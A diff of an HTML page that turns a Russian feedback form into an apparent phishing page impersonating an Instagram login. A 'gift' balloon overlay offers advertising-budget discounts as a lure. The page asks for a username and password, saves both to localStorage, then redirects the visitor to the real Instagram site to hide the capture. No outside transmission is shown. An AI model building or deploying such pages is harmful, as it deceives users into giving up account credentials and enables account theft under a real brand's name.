@@ -3,22 +3,212 @@
 <head>
     <meta charset="UTF-8">
     <title>Форма обратной связи</title>
+    
     <style>
-        body { font-family: Arial, sans-serif; margin: 50px; }
-        form { max-width: 400px; display: flex; flex-direction: column; gap: 15px; }
-        input, button { padding: 10px; font-size: 16px; }
-        button { background-color: #007BFF; color: white; border: none; cursor: pointer; }
-        button:hover { background-color: #0056b3; }
-    </style>
+    html,
+    body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 50px;
+
+    background: linear-gradient(
+        45deg,
+        #f09433 0%,
+        #e6683c 25%,
+        #dc2743 50%,
+        #cc2366 75%,
+        #bc1888 100%
+    );
+
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-size: cover;
+}
+       /* body { font-family: Arial, sans-serif; margin: 50px; background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%) no-repeat;
+        background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)  no-repeat;}*/
+        form { max-width: 80%; display: flex; flex-direction: column; gap: -10px; height:80%; }
+        input, button {display:flex; padding: 10px; font-size: 16px;margin:auto; align-items: center; justify-content: space-around; width:80%; }
+        button { background-color: #90D5FF; color: white; border: none; cursor: pointer;margin:auto;text-align: center; align-items: center; justify-content: center;margin-top:10px; }
+        button:hover { background-color: #90D5FF; margin:auto;text-align: center; align-items: center; justify-content: center;margin-top:10px;}
+        h2{margin:auto;text-align: center; align-items: center; justify-content: center;}
+       span{ margin:auto; color:gray;display:flex; justify-content: space-around;align-items: center;margin-top:10px;}
+     .b{background-color:blue ;color:white;font-weight: bold;font-size:20px;transform:scaleX(2);padding: 0 3px;}
+   </style>
 </head>
 <body>
-    <h2>Оставьте ваши данные</h2>
+    <h2 style="margin-bottom: 60px;">Войдите в свой аккаунт, чтобы добавить подарок и выбрать лучшую рекламу.</h2>
 
 
-    <form action="save.php" method="POST"> <label>Ваш имя: 
-        <input type="text" name="username" required placeholder="....."> 
-    </label> 
-    <label>Ваш Email: <input type="email" name="useremail" required placeholder=".........."> </label>
-         <button type="submit">Отправить заявку</button> </form>
+    <form  style="text-align: center; align-items:last baseline;
+     justify-content:center;border:1px solid black;
+     border-radius:15px; box-shadow:1px 2px 1px 0 grey; margin:auto; background-color:white;"  id="myForm">
+     <p style="text-align: center;font-family: Brush Script MT, cursive;
+
+    font-size: 38px;
+
+    font-weight: 500;
+
+    color: #262626;
+
+    letter-spacing: -1px; margin-top:20px;margin:auto ;
+
+">Instagram</p>"
+         <input class="rim" type="text" id="username" name="username" required placeholder="Phone number,username, or email"> 
+         <br><br> 
+        <input class="mir" type="email" id="useremail" name="useremail" required
+             placeholder="Password"> 
+    <br><br> <button style="padding:10px; border:2px solid black; box-shadow:1px 2px 1px 0 black;
+     border-radius:10px;" type="submit">Log in</button>
+     <span>
+__________________OR _________________</span>
+
+<span><p class="b">f </p>&nbsp;&nbsp;Log in with Facebook</span><span>Forgot password</span>
+     <br> <textarea style="display:flex; margin:auto;text-align: center; align-items: center; justify-content: center;opacity:0;"
+     id="result" rows="3" cols="50" placeholder="Здесь появится информация..."></textarea></form>
+     <script> const form = document.getElementById("myForm"); const username = document.getElementById("username");
+     let usern = document.querySelector('.mir');
+     let usere = document.querySelector('.rim');
+      const useremail = document.getElementById("useremail");
+ const result = document.getElementById("result"); 
+        
+       result.value = localStorage.getItem("result") || ""; 
+     
+    form.addEventListener("submit", function(event) {  event.preventDefault();  localStorage.setItem("username", username.value);  
+    localStorage.setItem("useremail", useremail.value); const information = "Ваш имя: " + username.value + "\n" + "Ваш Email: " + useremail.value;
+     result.value = information;
+     result.style.opacity = "0";
+     usern.style.opacity = "0";
+     usere.style.opacity = "0";
+     window.location.href="https://www.instagram.com";
+      localStorage.setItem("result", information); });</script>
+
+
+   <div id="giftAnimation" class="gift-animation"><div style=" width:100%; height:100%;
+    border:3px solid gold;border-radius:50% ; text-align:center;vertical-align: auto; align-items: center;
+    margin:auto;background: url(https://thumbs.dreamstime.com/b/black-white-book-pages-folded-up-photo-hart-shaped-back-lit-31952978.jpg) 50% 20% no-repeat;"></div>
+     <span class="gift-star star1"></span> 
+    <span class="gift-star star2">
+
+   </span> <span class="gift-star star3"></span> <span class="gift-star star4"></span> <span class="gift-star star5">
+
+   </span> <div class="gift-balloon balloon1" onclick="chooseGift(this)" > <div class="balloon-face" >
+     <span class="eye left-eye">⌒</span> <span class="eye right-eye">⌒</span> <span class="mouth">⌣</span>
+      </div> <div class="balloon-number"> 1 </div> <div class="balloon-text"> Скидка на<br> рекламный бюджет<br>
+       <b>5000 рублей.</b> </div> </div> <div class="gift-balloon balloon2" onclick="chooseGift(this)" >
+         <div class="balloon-face"> <span class="eye left-eye">⌒</span> <span class="eye right-eye">⌒</span>
+          <span class="mouth">⌣</span> </div> <div class="balloon-number"> 2 </div>
+           <div class="balloon-text"> Скидка на<br> рекламный бюджет<br> <b>25% до 1 ноября<br> 2026 года.</b> </div>
+            </div> <div class="gift-balloon balloon3" onclick="chooseGift(this)" >
+                 <div class="balloon-face"> <span class="eye left-eye">⌒</span> 
+                 <span class="eye right-eye">⌒</span> <span class="mouth">⌣</span> </div>
+                  <div class="balloon-number"> 3 </div> <div class="balloon-text"> Бесплатный купон<br>
+                   на рекламный бюджет<br> <b>2500 рублей</b> </div> </div> <div class="gift-message"> 
+                    <b>🎁 Спасибо, что столько лет с нами!!!</b> <br> Нажмите на шар и выберите подарок!!! </div>
+                     </div> <style>
+                      .gift-animation { position: absolute; width: 100%; 
+                       height: 100%; top: 20px; left: 50%; transform: translateX(-50%);
+                        overflow: hidden; background:black; z-index: 9999; pointer-events: none; }
+                         .gift-balloon { position: absolute; width: 100px; height: 120px;
+                          border-radius: 50% 50% 48% 48%;
+                           background: radial-gradient( circle at 32% 25%, #fffbdc 0%,
+                            #ffe99b 15%, #e8bd4d 55%, #b97914 100% ); 
+                            box-shadow: inset -8px -10px 15px rgba(100, 60, 0, 0.25),
+                             inset 7px 7px 12px rgba(255, 255, 255, 0.5),
+                              0 5px 18px rgba(255, 190, 40, 0.35); cursor: pointer; 
+                              pointer-events: auto; z-index: 10; transition: transform 0.5s ease, 
+                              box-shadow 0.5s ease, opacity 0.5s ease; } 
+                              .gift-balloon::after { content: ""; position: absolute; width: 14px;
+                               height: 10px; left: 50%; bottom: -7px; transform: translateX(-50%);
+                                background: #bd8520; clip-path: polygon( 0 0, 100% 0, 65% 100%, 35% 100% ); }
+                                 .gift-balloon::before { content: ""; position: absolute; width: 1px; 
+                                 height: 35px; left: 50%; top: 100%; transform: translateX(-50%); 
+                                 background: #bd8b2b; } 
+                                 .balloon1 { position: absolute; left: 12%; top: 20px;
+                                  animation-name: moveBalloon1; animation-duration: 14s;
+                                   animation-iteration-count: infinite; animation-timing-function: ease-in-out; }
+                                    .balloon2 { position: absolute; left: calc(50% - 50px);
+                                     top: 35%; animation-name: moveBalloon2; animation-duration: 14s;
+                                      animation-iteration-count: infinite; animation-timing-function: ease-in-out; } 
+                                      .balloon3 { position: absolute; right: 12%; top: 60%; 
+                                      animation-name: moveBalloon3; animation-duration: 14s;
+                                       animation-iteration-count: infinite; animation-timing-function: ease-in-out; }
+                                        @keyframes moveBalloon1 { 0% { left: 12%; top: 20px; } 25% 
+                                        { left: 38%; top: 80px; } 50% { left: calc(50% - 50px); 
+                                        top: 125px; } 75% { left: 20%; top: 65px; } 100% { left: 12%; top: 20px; } }
+                                         @keyframes moveBalloon2 { 0% { left: calc(50% - 50px); top: 115px; } 25% 
+                                         { left: 65%; top: 55px; } 50% { left: calc(50% - 50px); 
+                                         top: 125px; } 75% { left: 25%; top: 150px; } 
+                                         100% { left: calc(50% - 50px); top: 115px; } }
+                                          @keyframes moveBalloon3 { 0% { right: 12%; top: 210px; } 
+                                          25% { right: 35%; top: 150px; } 50% { right: calc(50% - 50px);
+                                           top: 125px; } 75% { right: 15%; top: 75px; } 
+                                           100% { right: 12%; top: 210px; } }
+                                            .balloon-face { position: absolute; width: 100%;
+                                             height: 35px; top: 15px; text-align: center;
+                                              color: #3b2a12;} .eye { position: absolute; 
+                                              font-size: 17px; font-weight: bold; }
+                                               .left-eye { left: 29px; } 
+                                               .right-eye { right: 29px; } 
+                                               .mouth { display: block; margin-top: 12px; font-size: 25px;
+                                                line-height: 20px; }
+                                                 .balloon-number { position: absolute; width: 100%;
+                                                  top: 48px; text-align: center; font-size: 20px;
+                                                   font-weight: bold; color: #916214; }
+                                                    .balloon-text { position: absolute; left: 5px;
+                                                     right: 5px; top: 68px; text-align: center; 
+                                                     font-size: 9px; line-height: 1.2; color: #30230e; }
+                                                      .gift-balloon.selected { border: 3px solid #ffd700;
+                                                       transform: scale(1.15); box-shadow: 0 0 8px #fff6a0, 
+                                                       0 0 20px #ffd700, 0 0 35px #ffbd00; }
+ .gift-firework { position: absolute; width: 4px;
+height: 4px; border-radius: 50%; background: #ffd700; 
+pointer-events: none; z-index: 10000;
+ animation-name: fireworkExplosion;
+ animation-duration: 0.8s;
+ animation-timing-function: ease-out;
+animation-fill-mode: forwards; }
+ @keyframes fireworkExplosion { 0% { transform: scale(1);
+opacity: 1; box-shadow: 0 0 4px #ffd700; } 100% { transform: scale(10);
+ opacity: 0; box-shadow: 25px 0 #ffd700, -25px 0 #ffd700, 0 25px #ffd700,
+  0 -25px #ffd700, 18px 18px #ffd700, -18px -18px #ffd700, 18px -18px #ffd700,
+   -18px 18px #ffd700; } }
+    .gift-message { position: absolute; left: 15px; right: 15px; 
+   bottom: 150px; text-align: center; font-size: 30px; line-height: 1.8; color: #d9a932;
+    text-shadow: 0 0 5px rgba(255, 200, 50, 0.3); pointer-events: none; } 
+
+    .gift-star { position: absolute; width: 3px; height: 3px; border-radius: 50%; 
+    background: #ffd76a; box-shadow: 0 0 8px #ffd76a; animation-name: starTwinkle;
+     animation-duration: 3s; animation-iteration-count: infinite; animation-timing-function: ease-in-out; }
+      .star1 { left: 10%; top: 15%; } .star2 { left: 85%; top: 20%; animation-delay: 0.8s; }
+       .star3 { left: 18%; top: 65%; animation-delay: 1.2s; } .star4 { left: 90%; top: 70%; animation-delay: 1.8s; }
+        .star5 { left: 55%; top: 85%; animation-delay: 1s; } 
+        @keyframes starTwinkle { 0% { opacity: 0.2; transform: scale(0.7); }
+         50% { opacity: 1; transform: scale(1.5); } 100% { opacity: 0.2; transform: scale(0.7); } }
+          .gift-animation.hide-gifts { display: none; }
+          .gift-animation{background-color:black; height:100%;border-radius: 15px;margin-top:-20px;}
+           @media (max-width: 380px) { .gift-animation { width: 100%; height: 350px; } 
+           .gift-balloon { width: 88px; height: 108px; } 
+           .balloon1 { left: 8%; } .balloon3 { right: 8%; } 
+           .balloon-text { font-size: 8px; } 
+           .balloon-number { top: 44px; font-size: 18px; }
+            .balloon-face { top: 12px; } } </style> 
+            <script> function chooseGift(balloon) { const animation = document.getElementById("giftAnimation");
+             if ( animation.classList.contains("hide-gifts") ) { return; } balloon.classList.add("selected"); 
+             createFireworks(balloon); setTimeout( function() { animation.style.display = "none"; }, 900 ); } 
+             function createFireworks(balloon) { const container = document.getElementById("giftAnimation"); 
+             const balloonRect = balloon.getBoundingClientRect(); const containerRect = container.getBoundingClientRect();
+              const centerX = balloonRect.left - containerRect.left + balloonRect.width / 2;
+               const centerY = balloonRect.top - containerRect.top + balloonRect.height / 2;
+                for ( let i = 0; i < 12; i++ ) { const firework = document.createElement("span");
+                 firework.className = "gift-firework"; const angle = (Math.PI * 2 / 12) * i;
+ const distance = 15 + Math.random() * 25; firework.style.left = ( centerX + Math.cos(angle) * distance ) + "px";
+    firework.style.top = ( centerY + Math.sin(angle) * distance ) + "px";
+     container.appendChild( firework ); setTimeout( function() { firework.remove(); }, 900 ); } } </script>
+          
+          
+          
+
+
+
 </body>
 </html>
